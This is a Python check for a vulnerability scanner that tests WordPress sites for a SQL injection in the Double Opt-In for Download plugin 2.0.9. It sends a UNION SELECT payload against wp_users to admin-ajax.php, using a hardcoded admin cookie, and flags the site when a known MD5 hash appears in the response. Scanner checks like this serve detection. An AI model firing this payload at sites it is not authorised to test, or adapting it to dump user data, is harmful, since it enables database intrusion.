#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
# WordPress Double Opt-In for Download Plugin 2.0.9 - SQL Injection
# http://www.bugscan.net/source/plugin/4474/template/
# https://www.exploit-db.com/exploits/39896/


def assign(service, arg):
    if service == fingerprint.wordpress:
        return True, arg


def audit(arg):
    url = "%s/wp-admin/admin-ajax.php?action=populate_download_edit_form" % arg
    payload = "id=0 UNION SELECT md5(123),2,4,5,6,7,8 FROM wp_users WHERE ID=1"
    # 本插件需要登录，测试时添加的 Cookie 信息
    header = {
        "Cookie": "wordpress_0a0611b42c0de0ad85d9791f5fe3c9a6=admin%7C1470302661%7C8vU7c0BuYQDE60tpqWJ1xjsflMVT21L8Bbr3ZCotUtQ%7C72b7dd82626905c25f7f2a9778cd37800d4b7ce0c2bc60a49db998b8c1199072;"
    }
    code, head, html, redir, log = hackhttp.http(url, post=payload, headers=header)
    # code, head, html, redir, log = hackhttp.http(url, post=payload)
    if code == 200 and "202cb962ac59075b964b07152d234b70" in html:
        security_hole("%s" % url, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.wordpress, "http://localhost:8000")[1])
